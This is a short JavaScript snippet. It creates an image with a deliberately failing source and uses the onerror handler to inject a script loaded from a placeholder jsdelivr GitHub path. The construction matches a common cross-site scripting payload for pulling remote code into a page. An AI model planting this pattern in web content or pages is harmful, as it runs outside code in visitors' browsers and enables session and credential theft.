// Create the image element
const img = document.createElement('img');
img.src = '/';
img.onerror = () => {
  // Create the script element
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/gh/username/repository/script.js';
  
  // Append the script element to the body
  document.body.appendChild(script);
};

// Append the image element to the body
document.body.appendChild(img);
